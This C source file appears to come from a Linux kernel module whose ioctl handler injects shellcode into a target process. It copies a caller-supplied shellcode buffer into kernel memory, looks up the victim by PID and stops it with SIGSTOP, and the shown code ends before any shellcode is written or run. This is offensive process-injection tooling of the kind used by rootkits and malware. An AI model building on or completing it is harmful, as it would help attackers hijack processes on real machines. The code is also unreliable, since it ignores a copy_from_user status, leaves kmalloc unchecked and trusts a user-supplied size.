#include "ioctl.h"

#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>

#include "consts.h"

#define KERNEL_PRIV 1

int inject_shellcode_ioctl_parser(unsigned long arg, ShellcodeInjectionParameters* parameters) {
    unsigned long status;
    void* shellcode_usermode_address;
    status = copy_from_user((void*)parameters, (void*)arg, sizeof(ShellcodeInjectionParameters));
    shellcode_usermode_address = parameters->shellcode;
    parameters->shellcode = kmalloc(parameters->shellcode_size, GFP_KERNEL);
    status = copy_from_user(parameters->shellcode, shellcode_usermode_address, parameters->shellcode_size);
    if (SUCCESS != status) {
        return -EFAULT;
    }
    return SUCCESS;
}

int inject_shellcode(ShellcodeInjectionParameters* parameters) {
    int status;
    struct task_struct* target_task;
    struct task_struct* prev_task;
    struct pid* pid_struct;
    printk(KERN_INFO "Start injecting the shellcode to pid %d\n", parameters->pid);
    pid_struct = find_get_pid(parameters->pid);
    target_task = pid_task(pid_struct, PIDTYPE_PID);
    if (NULL == target_task) {
        return INVALID_PID;
    }
    status = send_sig(SIGSTOP, target_task, KERNEL_PRIV);
    if (0 > status) {
        printk(KERN_INFO "Unable to stop the process, pid %d\n", parameters->pid);
        return SIGSTOP_FAILED;
    }
    return SUCCESS;
}

int inject_shellcode_ioctl_handler(unsigned long arg) {
    int status;
    ShellcodeInjectionParameters parameters;
    status = inject_shellcode_ioctl_parser(arg, &parameters);
    if (SUCCESS != status) {
        return status;
    }
    status = inject_shellcode(&parameters);
    if (SUCCESS != status) {
        kfree(parameters.shellcode);
        return status;
    }
    kfree(parameters.shellcode);
    return SUCCESS;
}